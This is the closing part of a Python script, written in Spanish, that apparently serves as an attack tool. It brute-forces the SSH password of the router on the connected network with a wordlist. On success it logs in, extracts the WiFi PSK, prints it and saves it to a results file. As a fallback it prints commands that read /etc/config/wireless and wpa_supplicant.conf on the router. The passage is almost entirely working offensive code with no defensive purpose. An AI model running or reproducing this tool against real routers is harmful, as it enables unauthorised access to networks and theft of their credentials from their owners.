            ip = gateway
        print(f"\nRed seleccionada: {selected['ssid'] or '<oculta>'} (conectada)")
        print(f"Router objetivo:  {ip}")
        print()

    # Crear directorio de resultados
    RESULTS_DIR = SKILL_DIR / "results"
    RESULTS_DIR.mkdir(parents=True, exist_ok=True)

    found = False
    elapsed = 0.0

    for attempt_user in [user]:
        success, password, elapsed = brute_force_ssh(ip, user, wordlist, port)

        if success and password:
            print(f"\n{'='*60}\n")
            print("¡PUEDES ENTRAR AL ROUTER CON ESTA CONTRASEÑA!")
            print("=" * 60 + "\n")

            print(f"Conecta a {ip} y usa:")
            print(f"   ssh {user}@{ip}")
            print()

            # Paso post-login: entrar al router y leer la PSK WiFi actual
            wifi_password = extract_wifi_password(ip, user, password, port)

            result_path = RESULTS_DIR / f"{user}_final.txt"
            if wifi_password:
                print(f"\n{'='*60}")
                print("  CONTRASEÑA WIFI ACTUAL DEL ROUTER")
                print(f"{'='*60}\n")
                print(f"  SSID/PSK: {wifi_password}\n")
                try:
                    with open(result_path, "a") as f:
                        f.write("\nContraseña WiFi actual del router:\n")
                        f.write(f"{wifi_password}\n")
                except OSError:
                    pass
            else:
                print("No se pudo leer la PSK automáticamente.")
                print("Para ver la contraseña actual del WiFi, ejecuta en el router:")
                print(f"   ssh {user}@{ip} 'cat /etc/config/wireless'")
                print(f"   ssh {user}@{ip} 'cat /etc/wpa_supplicant/wpa_supplicant.conf'")
                print()

            found = True
            break

    if not found:
        print(f"\n{'='*60}\n")
        print("No se pudo encontrar la contraseña con los usuarios probados.")
        print(f"Tiempo total de crackeo: {elapsed:.2f} segundos\n")


if __name__ == "__main__":
    main()
